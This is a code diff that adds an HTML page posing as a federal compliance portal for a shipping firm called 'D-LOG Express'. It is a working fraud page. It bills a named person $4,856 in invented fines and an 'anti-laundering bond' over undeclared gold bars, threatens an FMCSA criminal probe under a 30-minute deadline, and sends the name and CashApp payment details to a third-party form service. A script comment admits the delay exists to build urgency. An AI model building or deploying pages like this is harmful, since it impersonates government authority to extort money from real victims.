@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FEDERAL CASE: 679922-A | COMPLIANCE PORTAL</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --fed-blue: #002654; --alert-red: #b91c1c; --gold: #d4af37; --bg: #f1f5f9; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); margin: 0; color: #1e293b; overflow-x: hidden; }
+
+        header {
+            background: var(--fed-blue); color: white; padding: 20px 5%;
+            border-bottom: 4px solid var(--alert-red); display: flex;
+            justify-content: space-between; align-items: center;
+        }
+
+        .logo { font-weight: 900; font-size: 1.5rem; font-style: italic; }
+        .logo span { color: var(--alert-red); }
+
+        .container { max-width: 1100px; margin: 30px auto; padding: 0 20px; display: grid; grid-template-columns: 1fr 1.2fr; gap: 25px; }
+        @media (max-width: 900px) { .container { grid-template-columns: 1fr; } }
+
+        .card { background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; }
+        .card-header { background: #f8fafc; padding: 15px 25px; font-weight: 800; font-size: 12px; text-transform: uppercase; color: #64748b; border-bottom: 1px solid #eee; }
+
+        /* Itemized Ledger */
+        .ledger { background: #fffcf0; padding: 20px; border: 1px solid #fef3c7; margin: 20px; border-radius: 6px; }
+        .ledger-row { display: flex; justify-content: space-between; padding: 10px 0; font-size: 13px; border-bottom: 1px dotted #d4af37; }
+        .ledger-row:last-child { border: none; font-size: 18px; color: var(--alert-red); font-weight: 900; }
+        .reason-text { font-size: 11px; color: #92400e; font-style: italic; margin-top: -8px; margin-bottom: 5px; }
+
+        /* Form */
+        form { padding: 25px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 11px; font-weight: 800; text-transform: uppercase; color: var(--fed-blue); margin-bottom: 5px; }
+        input, textarea { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 4px; box-sizing: border-box; }
+
+        .btn-submit {
+            background: var(--alert-red); color: white; width: 100%; border: none; padding: 18px;
+            font-weight: 900; text-transform: uppercase; border-radius: 4px; cursor: pointer; font-size: 14px;
+        }
+
+        /* The Notification Modal */
+        #notificationModal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center;
+        }
+
+        .modal-content {
+            background: white; width: 90%; max-width: 550px; border-radius: 12px;
+            padding: 40px; text-align: left; border-top: 10px solid var(--alert-red);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-title { color: var(--alert-red); font-weight: 900; font-size: 20px; text-transform: uppercase; margin-bottom: 20px; }
+        .modal-text { font-size: 14px; line-height: 1.6; color: #334155; }
+        .modal-text b { color: #000; }
+        
+        .loading-bar { height: 4px; background: #eee; width: 100%; margin: 20px 0; overflow: hidden; }
+        .loading-fill { height: 100%; background: var(--fed-blue); width: 0%; animation: load 3s forwards; }
+        @keyframes load { to { width: 100%; } }
+
+        footer { text-align: center; padding: 40px; font-size: 10px; color: #94a3b8; font-weight: 700; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">D-LOG <span>EXPRESS</span></div>
+    <div style="font-weight: 800; font-size: 12px; color: #f8fafc;">CASE ID: MN-679922-A</div>
+</header>
+
+<div class="container">
+    <div class="card">
+        <div class="card-header">Official Financial Assessment</div>
+        <div class="ledger">
+            <div class="ledger-row"><span>1.Civil Fine (49 CFR § 172)</span><strong>$2,500.00</strong></div>
+            <div class="reason-text">Non-disclosure of high-density bullion (6 bars) on original manifest.</div>
+
+            <div class="ledger-row"><span>2. High-Value Anti-Laundering Bond</span><strong>$2,356.00</strong></div>
+            <div class="reason-text">Compulsory inter-state tax/bond to clear suspicion of money-laundering/smuggling.</div>
+
+            <div class="ledger-row"><span>TOTAL SETTLEMENT</span><strong>$4,856.00</strong></div>
+        </div>
+        <div style="padding: 20px; font-size: 12px; color: #475569; border-top: 1px solid #eee;">
+            <strong>Warning:</strong> Failure to clear the high-value bond will escalate this file to the <b>Federal Motor Carrier Safety Administration (FMCSA)</b> for a full financial crimes investigation.
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">Incident Settlement Form</div>
+        <form id="complianceForm" action="https://formspree.io/f/xgolpnyp" method="POST">
+            <div class="form-group"><label>Full Legal Name</label><input type="text" name="name" value="David Kiel" required></div>
+            <div class="form-group">
+                <label>Undeclared Assets Description (Quantity: 6 Bars)</label>
+                <textarea name="gold_declaration" placeholder="Specify purity and origin of the discovered bullion..." required></textarea>
+            </div>
+            <div class="form-group"><label>CashApp Tag / Payment Reference</label><input type="text" name="payment_ref" required></div>
+            <button type="button" onclick="showNotification()" class="btn-submit">Settle Fines & Clear Release</button>
+        </form>
+    </div>
+</div>
+
+<div id="notificationModal">
+    <div class="modal-content">
+        <div class="modal-title"><i class="fas fa-gavel"></i> Federal Regulatory Advisory</div>
+        <div class="modal-text">
+            <b>Your statement and settlement are being processed.</b><br><br>
+            Because the <b>6 bars of gold</b> were undisclosed, the state authorities have flagged this transport for potential <b>money laundering and tax evasion</b>. 
+            <br><br>
+            By submitting this settlement, you are providing the <b>Mandatory Anti-Laundering Bond ($2,356)</b> required to bypass a full criminal probe by federal financial enforcement. 
+            <br><br>
+            <span style="color: #b91c1c;"><b>Notice:</b></span> Since these items were hidden from D-LOG Express, your <b>insurance coverage is VOID</b>. You are now solely responsible for any damage, loss, or further legal seizure if this settlement is not cleared within 30 minutes.
+        </div>
+        <div class="loading-bar"><div class="loading-fill"></div></div>
+        <p style="font-size: 11px; text-align: center; color: #64748b;">Submitting data to Asset Forfeiture Division...</p>
+    </div>
+</div>
+
+<script>
+    function showNotification() {
+        // Show the modal
+        document.getElementById('notificationModal').style.display = 'flex';
+        
+        // Wait 3.5 seconds (to let them read the urgency) then submit the form
+        setTimeout(function() {
+            document.getElementById('complianceForm').submit();
+        }, 4500);
+    }
+</script>
+
+<footer>OFFICIAL GOVERNMENT CORRESPONDENCE | DO NOT REPRODUCE</footer>
+</body>
+</html>
